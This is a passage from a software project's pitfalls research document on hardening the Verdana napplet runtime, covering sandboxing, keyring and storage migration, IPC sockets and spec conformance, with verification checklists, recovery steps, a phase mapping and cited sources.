| Plaintext-fallback warning on every launch | Alarm fatigue; Android shows it constantly | Desktop only, once per cause, with a "how to enable a keyring" link |
| Shortcut click does nothing after an update | "App is broken" | Client-side legacy-port fallback for one release, or a visible "please restart Verdana" toast |
| Napplet hangs (no shim deadline) when the launcher misses a reply | Infinite spinner | Structural reply guarantee (Pitfall 9) |
| Napplets rejected by new validators disappear | Lost apps | Mark them "incompatible" with the reason; keep their data |

## "Looks Done But Isn't" Checklist

- [ ] **Child extraction hardened:** verify `/tmp/webview-*` is never created (`strace`/`ls`), the CWD fallback is gone, and the directory is owned by the user with mode 0700.
- [ ] **Token defense:** verify the adversarial fixture was run on **WebKitGTK, WebView2, and WKWebView** and recorded in the checklist.
- [ ] **Sandbox:** verify `location.reload()` re-delivers `shell.init`, and that navigation to https/data is blocked or reset.
- [ ] **Shim upgrade:** verify the hash test, a named patch list, and the "every emitted request type has a handler" test.
- [ ] **Conformance checklist:** verify every row has a spec SHA, conflicting clauses are cross-referenced, and spec text snapshots are committed.
- [ ] **Permission centralization:** verify the golden file of type→policy, and that no `None` entry lacks a reason.
- [ ] **Limits:** verify Go-side bounds exist even when `napplet-host.js` is bypassed (unit tests call `napEnqueue` directly).
- [ ] **Instance socket:** verify the concurrent cold-start test, the stale-socket test, macOS path length, the existing-0755-dir test, and that `launcher.port` is removed.
- [ ] **Keyring:** verify a locked keyring at startup does not regenerate `ClientKey`, a bunker login survives migration, `state.json` no longer contains `client_key` or `login`, and the Android build shows no warning.
- [ ] **Storage:** verify the legacy fallback is removed, the trial→install promotion with a newer event lands in the right namespace, the notice appears on Android, and legacy files are kept.
- [ ] **Android:** verify `android.yml` ran on the PR and the APK booted a napplet.
- [ ] **NAPPLETS.md:** verify the domain table, shim version, and storage keying text match the code.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| `ClientKey` regenerated or lost | MEDIUM | Restore from `state.json.corrupt-*` or the legacy plaintext copy kept until a verified migration; otherwise users re-pair their bunker |
| Storage namespace mismatch after promotion or migration | LOW if legacy files are kept | Run a one-shot remap from retained legacy and old-hash files; that is why deletion waits a release |
| Shim patch lost in an upgrade | LOW | Re-apply the named hunk from `shim/README.md`; the hash test catches it in CI |
| Android build broken by a backend dependency | LOW to MEDIUM | Move the code to `desktop/`, behind an optional interface |
| Escape via frame navigation discovered after release | HIGH (trust) | Ship a host-page `frame-src` header fix; the backend-side reset on unexpected `shell.ready` also limits the damage |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1 Stale docs vs code | Ground truth (first) | Requirements re-scoped; hash test green |
| 2 Frame navigation/reload | Sandbox | Fixture: reload, data:, https: |
| 3 go-webview `embedded` + CWD fallback | Desktop process | strace/ls; unit test of the extraction directory checks |
| 4 Engine binding reachability | Sandbox | Adversarial fixture on 3 OSes |
| 5 CSP gaps vs injection MUST | Sandbox + conformance | Engine flag asserted; checklist row |
| 6 Contradicting specs | Conformance | "Conflicts" section with both SHAs |
| 7 Pin drift | Conformance (first task) | Spec snapshots committed |
| 8 Unknown-type hangs on upgrade | Shim upgrade | Request-type coverage test |
| 9 Reply guarantee | Robustness | Test: a handler returning without a reply gets `fail()` |
| 10 Permission policy | Sandbox | Golden type→policy file |
| 11 Go-side limits / case-folding | Robustness | Per-bound tests through `napEnqueue` |
| 12 Unix socket | Desktop process | Race, stale, length, and permission tests |
| 13 Named pipe | Desktop process | Manual Windows check of the DACL; CI build |
| 14 Keyring migration | Secrets | Locked-keyring and bunker-survival tests; Android no-warning |
| 15 Storage rekey | Storage | Backfill, promotion, and notice tests; legacy files retained |
| 16 Android build | All backend phases (CI change first) | `android.yml` on PR |
| 17 OpenLink | Desktop process | Table test of malicious URLs |
| 18 Validator strictness | Conformance | Relay corpus fixture with reviewed rejections |

## Sources

- Repo (verified): `backend/nap.go`, `backend/nap_basic.go`, `backend/window_storage.go`, `backend/launcher_state.go`, `backend/dev.go`, `backend/napplet.go`, `backend/webview/napplet-host.js`, `backend/webview/embed.go`, `backend/webview/shim/README.md`, `desktop/child/napplet.go`, `desktop/childproc.go`, `desktop/embed_prod.go`, `desktop/singleinstance.go`, `desktop/main.go`, `desktop/internal/instancelock/`, `.github/workflows/{android,desktop}.yml`
- Module source (verified): `github.com/abemedia/go-webview@v0.0.0-20250327021345-7b06ad397f16/embedded/embedded.go`, `load_unix.go`
- Specs (verified at pinned SHAs): NIP-5D `24711d9` (nostr-protocol/nips PR #2303); WEB-NAPPLET `7ae5b19` (hzrd149/naps); NAP-STORAGE `f71e84e`; napplet/web `956135bf` (shim 0.30.0 CHANGELOG, `packages/nap/src/resource/*`, `packages/conformance/README.md`)
- [CSP navigate-to removed, never shipped](https://content-security-policy.com/navigate-to/) (MEDIUM)
- [centralcsp: connect-src does not cover WebRTC; webrtc directive unshipped](https://next.centralcsp.com/en/docs/web-security/policies/content-security-policy/directives/connect-src) and [public-webrtc thread on CSP connect-src](https://lists.w3.org/Archives/Public/public-webrtc/2018Jan/0109.html) (MEDIUM)
- [frame-src applies to self-initiated iframe navigations (Mozilla bug 1557114 discussion)](https://https-bugzilla_mozilla_org.proxy.bugsmash.io/show_bug.cgi?id=1557114) and [w3c/webappsec-csp #360](https://github.com/w3c/webappsec-csp/issues/360) (MEDIUM; verify per engine)
- [Named Pipe Security and Access Rights (Microsoft)](https://learn.microsoft.com/en-ie/Windows/Win32/ipc/named-pipe-security-and-access-rights), [CreateNamedPipeW](https://learn.microsoft.com/windows/win32/api/namedpipeapi/nf-namedpipeapi-createnamedpipew), [CyberArk: RDP named pipe squatting](https://www.cyberark.com/resources/all-blog-posts/that-pipe-is-still-leaking-revisiting-the-rdp-named-pipe-vulnerability) (MEDIUM)
- [CoreWebView2Frame.WebMessageReceived](https://learn.microsoft.com/en-us/dotnet/api/microsoft.web.webview2.core.corewebview2frame.webmessagereceived) (LOW to MEDIUM)
- [WebKit bug 204557 / WKScriptMessage frameInfo](https://bugs.webkit.org/show_bug.cgi?id=204557) (LOW)
- [Go issue 43635: unix socket path too long on macOS](https://golang.org/issue/43635) (MEDIUM)
- [zalando/go-keyring (macOS uses /usr/bin/security)](https://pkg.go.dev/github.com/zalando/go-keyring@v0.2.8), [Apple forum: keychain prompt after each code update](https://developer.apple.com/forums/thread/734689), [Arch wiki GNOME/Keyring (CVE-2018-19358)](https://wiki.archlinux.org/title/GNOME/Keyring), [Flatpak secrets management approaches](https://opensource.com/article/19/11/secrets-management-flatpak-applications) (LOW to MEDIUM)
- Go `encoding/json` documentation: case-insensitive field matching (HIGH)

---
*Pitfalls research for: napplet runtime hardening and strict draft-spec conformance (Verdana)*
*Researched: 2026-10-02*
